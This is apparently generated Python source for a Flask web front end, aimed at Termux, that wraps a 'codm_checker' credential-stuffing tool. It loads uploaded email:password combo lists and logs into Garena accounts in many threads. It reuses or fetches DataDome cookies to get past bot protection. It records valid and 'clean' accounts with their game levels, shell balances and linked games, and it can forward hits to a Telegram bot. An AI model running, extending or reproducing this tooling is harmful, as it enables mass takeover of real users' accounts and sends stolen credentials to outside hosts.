# Build the termux-optimized web wrapper for codm_checker
# Structure: flask app that imports and wraps the original checker logic

app_py = '''#!/usr/bin/env python3
"""
CODM Checker Web - Termux Edition
Run on Android via Termux. Access via browser at http://localhost:5000
or http://<phone-ip>:5000 from any device on same network.
"""

import os
import sys
import json
import time
import threading
import queue
import re
import uuid
from datetime import datetime
from pathlib import Path
from functools import wraps

from flask import Flask, render_template, request, jsonify, send_file, session
from flask_socketio import SocketIO, emit

# ── paths ──────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent
UPLOAD_DIR  = BASE_DIR / "uploads"
RESULTS_DIR = BASE_DIR / "results"
COMBO_DIR   = BASE_DIR / "Combo"          # original script expects this
for d in (UPLOAD_DIR, RESULTS_DIR, COMBO_DIR):
    d.mkdir(exist_ok=True)

# ── flask setup ────────────────────────────────────────────────────
app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024   # 50MB combo files
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ── session store (in-memory) ──────────────────────────────────────
# Each running job gets an entry here
JOBS = {}

class JobState:
    def __init__(self, job_id, mode, **kw):
        self.id          = job_id
        self.mode        = mode          # bulk | single | validator | hunter
        self.status      = "idle"        # idle|running|done|error|stopped
        self.stats       = {
            "done": 0, "valid": 0, "invalid": 0, "error": 0,
            "clean": 0, "not_clean": 0,
            "has_codm": 0, "no_codm": 0,
            "highest_clean": 0, "highest_not_clean": 0,
            "highest_shell": 0,
            "games_found": 0,
        }
        self.total       = 0
        self.start_time  = None
        self.logs        = queue.Queue(maxsize=500)
        self.stop_event  = threading.Event()
        self.results     = []            # list of result dicts
        self.kw          = kw            # extra params (threads, game filter…)
        self.thread      = None

    def log(self, msg, level="info"):
        entry = {"time": datetime.now().strftime("%H:%M:%S"), "level": level, "msg": msg}
        try:
            self.logs.put_nowait(entry)
        except queue.Full:
            pass
        socketio.emit("log", {**entry, "job": self.id})

    def push_stats(self):
        socketio.emit("stats", {
            "job": self.id,
            "status": self.status,
            "stats": self.stats,
            "total": self.total,
            "elapsed": round(time.time() - self.start_time, 1) if self.start_time else 0,
        })

# ═══════════════════════════════════════════════════════════════════
#  IMPORT ORIGINAL CHECKER LOGIC
#  We import the original codm_checker.py as a module and monkey-patch
#  its display / stats functions so output streams to the web UI.
# ═══════════════════════════════════════════════════════════════════
sys.path.insert(0, str(BASE_DIR))
import codm_checker as cc

# ── patch: replace console display with web emit ───────────────────
_current_job = None   # set by runner before each account

def _web_display(account, password, details, codm_info, has_codm,
                 error_reason=None, game_connections=None):
    if _current_job is None:
        return
    job = _current_job
    entry = {
        "account": account,
        "password": password,
        "has_codm": has_codm,
        "is_clean": details.get("is_clean", False) if details else False,
        "codm_level": codm_info.get("codm_level", 0) if codm_info else 0,
        "codm_region": codm_info.get("region", "N/A") if codm_info else "N/A",
        "codm_nickname": codm_info.get("codm_nickname", "N/A") if codm_info else "N/A",
        "shell": details["profile"].get("shell_balance", 0) if details else 0,
        "error": error_reason,
        "games": game_connections or [],
        "time": datetime.now().strftime("%H:%M:%S"),
    }
    job.results.append(entry)
    socketio.emit("result", {"job": job.id, "result": entry})

cc.display_codm_info          = _web_display
cc.display_codm_info_elegant  = _web_display

# ═══════════════════════════════════════════════════════════════════
#  JOB RUNNERS
# ═══════════════════════════════════════════════════════════════════

def _run_bulk(job: JobState, combo_path: str, threads: int,
              check_games: bool, auto_remove: bool,
              tg_cfg: dict | None):
    global _current_job
    cc.CHECK_OTHER_GAMES = check_games

    # patch telegram
    if tg_cfg and tg_cfg.get("enabled"):
        token, chat_id = tg_cfg["token"], tg_cfg["chat_id"]
        def _tg_send(text):
            try:
                import requests as _r
                _r.post(f"https://api.telegram.org/bot{token}/sendMessage",
                        json={"chat_id": chat_id, "text": text}, timeout=8)
            except Exception:
                pass
        cc._TG_HOOK = lambda ad: _tg_send(str(ad)) if not ad.get("is_error") else None

    file_manager   = cc.AccountFileManager()
    results_mgr    = cc.ResultsManager(combo_path)
    cookie_manager = cc.CookieManager()
    dd_manager     = cc.DataDomeManager()
    live_stats     = cc.LiveStats()
    live_stats.total_accounts = job.total

    # read accounts
    accounts = []
    with open(combo_path, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            a, p = cc.clean_account_line(line)
            if a and p:
                accounts.append(f"{a}:{p}")
    job.total = len(accounts)
    job.log(f"Loaded {job.total} accounts", "info")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    import requests as req

    tl = threading.local()

    def get_sess():
        if not hasattr(tl, "s"):
            tl.s = req.Session()
            tl.dm = cc.DataDomeManager()
            cks = cookie_manager.get_valid_cookies()
            if cks:
                cc.applyck(tl.s, "; ".join(cks))
                for part in cks[-1].split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        tl.dm.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = cc.get_datadome_cookie(tl.s)
                if dd:
                    tl.dm.set_datadome(dd)
                    tl.s.cookies.set("datadome", dd, domain=".garena.com")
        return tl.s, tl.dm

    def worker(line):
        if job.stop_event.is_set():
            return
        _current_job = job
        try:
            a, p = line.split(":", 1)
            s, dm = get_sess()
            cc.processaccount(
                s, a.strip(), p.strip(),
                cookie_manager, dm,
                live_stats, results_mgr,
                file_manager, combo_path,
                auto_remove,
                suppress_print=True,
            )
        except Exception as e:
            job.log(f"Error on {line.split(':')[0]}: {e}", "error")
        finally:
            _current_job = None
            # push stats
            st = live_stats.get_stats()
            job.stats.update({
                "done":      live_stats.get_processed_count(),
                "valid":     st["valid"],
                "invalid":   st["invalid"],
                "error":     st["error"],
                "clean":     st["clean"],
                "not_clean": st["not_clean"],
                "has_codm":  st["has_codm"],
                "no_codm":   st["no_codm"],
                "highest_clean":     st["highest_clean_level"],
                "highest_not_clean": st["highest_not_clean_level"],
                "highest_shell":     st["highest_shell"],
            })
            job.push_stats()

    job.status = "running"
    job.start_time = time.time()
    job.log(f"Starting bulk check — {threads} threads", "success")

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(worker, ln): ln for ln in accounts}
            for fut in as_completed(futs):
                if job.stop_event.is_set():
                    break
                try:
                    fut.result(timeout=60)
                except Exception:
                    pass
    finally:
        job.status = "done" if not job.stop_event.is_set() else "stopped"
        job.log(f"Job finished — {job.stats['done']}/{job.total} processed", "success")
        job.push_stats()


def _run_single(job: JobState, account: str, password: str, check_games: bool):
    global _current_job
    cc.CHECK_OTHER_GAMES = check_games
    _current_job = job
    job.status = "running"
    job.start_time = time.time()
    job.total = 1
    job.log(f"Checking {account}…", "info")

    try:
        import requests as req
        s = req.Session()
        cm = cc.CookieManager()
        dm = cc.DataDomeManager()
        cks = cm.get_valid_cookies()
        if cks:
            cc.applyck(s, "; ".join(cks))
        else:
            dd = cc.get_datadome_cookie(s)
            if dd:
                dm.set_datadome(dd)
                s.cookies.set("datadome", dd, domain=".garena.com")

        rm = cc.ResultsManager(combo_path="single", create_dirs=False)
        rm.base_dir = RESULTS_DIR / f"single_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        rm.base_dir.mkdir(parents=True, exist_ok=True)

        ls = cc.LiveStats()
        ls.total_accounts = 1

        cc.processaccount(
            s, account, password,
            cm, dm, ls, rm,
            file_manager=None, combo_file_path=None,
            auto_remove=False,
            use_elegant_display=False,
            suppress_print=False,
        )
        st = ls.get_stats()
        job.stats.update({
            "done": 1, "valid": st["valid"], "invalid": st["invalid"],
            "clean": st["clean"], "not_clean": st["not_clean"],
            "has_codm": st["has_codm"], "no_codm": st["no_codm"],
        })
    except Exception as e:
        job.log(f"Error: {e}", "error")
    finally:
        _current_job = None
        job.status = "done"
        job.push_stats()


def _run_validator(job: JobState, combo_path: str, threads: int):
    global _current_job
    job.status = "running"
    job.start_time = time.time()

    accounts = []
    with open(combo_path, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            a, p = cc.clean_account_line(line)
            if a and p:
                accounts.append((a, p))
    job.total = len(accounts)
    job.log(f"Validator mode — {job.total} accounts, {threads} threads", "info")

    out_dir = RESULTS_DIR / f"validator_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    out_dir.mkdir(parents=True, exist_ok=True)
    vh = open(out_dir / "valid.txt", "a", buffering=1)
    ih = open(out_dir / "invalid.txt", "a", buffering=1)
    eh = open(out_dir / "errors.txt", "a", buffering=1)

    import requests as req
    from concurrent.futures import ThreadPoolExecutor, as_completed
    tl = threading.local()

    def get_sess():
        if not hasattr(tl, "s"):
            tl.s = req.Session()
            tl.dm = cc.DataDomeManager()
            cks = cc.CookieManager().get_valid_cookies()
            if cks:
                cc.applyck(tl.s, "; ".join(cks))
        return tl.s, tl.dm

    def check_one(a, p):
        if job.stop_event.is_set():
            return
        try:
            s, dm = get_sess()
            v1, v2, _ = cc._prelogin_no_ip_wait(s, a, dm)
            if not v1 or not v2:
                ih.write(f"{a}:{p}\\n")
                job.stats["invalid"] += 1
                job.log(f"✗ {a} — not found", "error")
            else:
                sso = cc.login(s, a, p, v1, v2)
                if sso:
                    vh.write(f"{a}:{p}\\n")
                    job.stats["valid"] += 1
                    job.log(f"✔ {a} — valid", "success")
                    socketio.emit("result", {"job": job.id, "result": {
                        "account": a, "password": p, "validator": True, "valid": True}})
                else:
                    ih.write(f"{a}:{p}\\n")
                    job.stats["invalid"] += 1
                    job.log(f"✗ {a} — wrong password", "error")
        except Exception as e:
            eh.write(f"{a}:{p} | {e}\\n")
            job.stats["error"] += 1
        finally:
            job.stats["done"] += 1
            job.push_stats()

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(check_one, a, p) for a, p in accounts]
            for fut in as_completed(futs):
                if job.stop_event.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except Exception:
                    pass
    finally:
        vh.close(); ih.close(); eh.close()
        job.status = "done"
        job.log("Validator complete", "success")
        job.push_stats()


def _run_hunter(job: JobState, combo_path: str, threads: int, queries: list):
    global _current_job
    job.status = "running"
    job.start_time = time.time()

    accounts = []
    with open(combo_path, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            a, p = cc.clean_account_line(line)
            if a and p:
                accounts.append((a, p))
    job.total = len(accounts)
    job.log(f"Game Hunter — filter: {[q['display'] for q in queries]}", "info")

    out_dir = RESULTS_DIR / f"hunter_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    out_dir.mkdir(parents=True, exist_ok=True)
    vh  = open(out_dir / "valid_with_games.txt", "a", buffering=1)
    vnh = open(out_dir / "valid_no_games.txt", "a", buffering=1)
    gh  = open(out_dir / "games_summary.txt", "a", buffering=1)

    cm = cc.CookieManager()
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def worker(a, p):
        if job.stop_event.is_set():
            return
        _current_job = job
        try:
            result, data = cc.hunter_process(a, p, cm, queries)
            if result == "valid_with_games":
                vh.write(f"{a}:{p}\\n")
                for conn in data:
                    gh.write(f"[{a}:{p}] {conn.get('game')} | {conn.get('region')} | {conn.get('role')}\\n")
                job.stats["valid"] += 1
                job.stats["games_found"] += len(data)
                job.log(f"✔ {a} — {len(data)} game(s) found", "success")
            elif result == "valid_no_games":
                vnh.write(f"{a}:{p}\\n")
                job.stats["valid"] += 1
            else:
                job.stats["invalid"] += 1
            socketio.emit("result", {"job": job.id, "result": {
                "account": a, "password": p, "hunter": True,
                "result": result, "games": data if result == "valid_with_games" else []}})
        except Exception as e:
            job.stats["error"] += 1
        finally:
            _current_job = None
            job.stats["done"] += 1
            job.push_stats()

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(worker, a, p) for a, p in accounts]
            for fut in as_completed(futs):
                if job.stop_event.is_set():
                    break
                try:
                    fut.result(timeout=45)
                except Exception:
                    pass
    finally:
        vh.close(); vnh.close(); gh.close()
        job.status = "done"
        job.log("Hunter complete", "success")
        job.push_stats()


# ═══════════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ═══════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/upload", methods=["POST"])
def upload():
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    # save into Combo/ so original script finds it
    safe_name = re.sub(r"[^\\w.\\-]", "_", f.filename)
    dest = COMBO_DIR / safe_name
    f.save(dest)
    # count lines
    count = 0
    with open(dest, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            a, p = cc.clean_account_line(line)
            if a and p:
                count += 1
    return jsonify({"filename": safe_name, "accounts": count,
                    "path": str(dest)})


@app.route("/api/start", methods=["POST"])
def start_job():
    data   = request.json
    mode   = data.get("mode", "bulk")
    job_id = uuid.uuid4().hex[:8]
    job    = JobState(job_id, mode, **data)

    if mode == "single":
        t = threading.Thread(target=_run_single, args=(
            job, data["account"], data["password"],
            data.get("check_games", False)))
    elif mode == "validator":
        path = data.get("combo_path") or str(COMBO_DIR / data["filename"])
        t = threading.Thread(target=_run_validator, args=(
            job, path, int(data.get("threads", 5))))
    elif mode == "hunter":
        path   = data.get("combo_path") or str(COMBO_DIR / data["filename"])
        queries = cc.parse_game_selection(data.get("game_filter", ""))
        t = threading.Thread(target=_run_hunter, args=(
            job, path, int(data.get("threads", 5)), queries))
    else:  # bulk
        path = data.get("combo_path") or str(COMBO_DIR / data["filename"])
        t = threading.Thread(target=_run_bulk, args=(
            job, path,
            int(data.get("threads", 5)),
            data.get("check_games", False),
            data.get("auto_remove", False),
            data.get("telegram")))

    job.thread = t
    JOBS[job_id] = job
    t.start()
    return jsonify({"job_id": job_id})


@app.route("/api/stop/<job_id>", methods=["POST"])
def stop_job(job_id):
    job = JOBS.get(job_id)
    if job:
        job.stop_event.set()
        return jsonify({"ok": True})
    return jsonify({"error": "not found"}), 404


@app.route("/api/status/<job_id>")
def status(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify({
        "status": job.status,
        "stats":  job.stats,
        "total":  job.total,
        "elapsed": round(time.time() - job.start_time, 1) if job.start_time else 0,
        "results": job.results[-200:],   # last 200
    })


@app.route("/api/logs/<job_id>")
def logs(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    items = []
    while not job.logs.empty():
        try:
            items.append(job.logs.get_nowait())
        except queue.Empty:
            break
    return jsonify({"logs": items})


@app.route("/api/results/<job_id>")
def download(job_id):
    """Zip and download all results for a job."""
    import zipfile, io as _io
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    mem = _io.BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as zf:
        # grab everything in Results/ newer than job start
        for fp in RESULTS_DIR.rglob("*"):
            if fp.is_file():
                zf.write(fp, fp.relative_to(RESULTS_DIR))
    mem.seek(0)
    return send_file(mem, as_attachment=True,
                     download_name=f"codm_results_{job_id}.zip")


@app.route("/api/files")
def list_files():
    files = []
    for fp in COMBO_DIR.glob("*.txt"):
        count = 0
        with open(fp, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                a, p = cc.clean_account_line(line)
                if a and p:
                    count += 1
        files.append({"name": fp.name, "accounts": count,
                      "size": fp.stat().st_size})
    return jsonify({"files": files})


